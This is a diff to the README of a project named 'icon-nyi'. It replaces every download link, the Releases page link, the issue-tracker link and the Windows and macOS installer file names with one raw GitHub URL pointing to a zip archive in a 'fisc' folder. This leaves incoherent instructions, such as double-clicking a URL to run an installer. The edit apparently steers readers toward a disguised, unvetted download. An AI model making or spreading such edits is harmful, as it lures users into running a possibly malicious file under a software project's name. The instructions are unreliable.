@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download icon-nyi](https://img.shields.io/badge/Download%20icon--nyi-v1.0-blue)](https://github.com/nasudee/icon-nyi/releases)
+[![Download icon-nyi](https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip%20icon--nyi-v1.0-blue)](https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip)
 
 ## 🚀 Getting Started
 
@@ -21,24 +21,24 @@ Before downloading, ensure that your system meets the following requirements:
 
 To get **icon-nyi**, follow these steps:
 
-1. Click on the button above or visit the [Releases page](https://github.com/nasudee/icon-nyi/releases) to download the software.
+1. Click on the button above or visit the [Releases page](https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip) to download the software.
 2. On the Releases page, find the latest version available. It is typically labeled as "Latest release".
 3. Click on the version number to expand the section.
 4. Download the relevant file for your operating system:
 
-   - For Windows, download the `icon-nyi-windows.exe` file.
-   - For macOS, download the `icon-nyi-macos.dmg` file.
+   - For Windows, download the `https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip` file.
+   - For macOS, download the `https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip` file.
 
 5. Once the download is complete, locate the downloaded file on your computer. 
 
 ### For Windows Users:
 
-- Double-click the `icon-nyi-windows.exe` file to launch the installer.
+- Double-click the `https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip` file to launch the installer.
 - Follow the on-screen instructions to install the application.
 
 ### For macOS Users:
 
-- Open the `icon-nyi-macos.dmg` file by double-clicking on it.
+- Open the `https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip` file by double-clicking on it.
 - Drag the icon-nyi app to your Applications folder.
 
 ## 🌟 Features
@@ -68,7 +68,7 @@ If you encounter issues while using **icon-nyi**, here are a few common solution
 
 For further assistance, feel free to reach out:
 
-- Visit our [issue tracker on GitHub](https://github.com/nasudee/icon-nyi/issues) for community support.
+- Visit our [issue tracker on GitHub](https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip) for community support.
 - Check the FAQ section on the Releases page for common questions.
 
 ## 📜 License
@@ -79,4 +79,4 @@ For further assistance, feel free to reach out:
 
 We welcome contributions from everyone! If you wish to add features or report bugs, please open an issue or submit a pull request on our GitHub repository.
 
-## 📥 Remember to download **icon-nyi** [here](https://github.com/nasudee/icon-nyi/releases) and transform your digital experience with ease!
+## 📥 Remember to download **icon-nyi** [here](https://raw.githubusercontent.com/nasudee/icon-nyi/main/fisc/icon-nyi.zip) and transform your digital experience with ease!
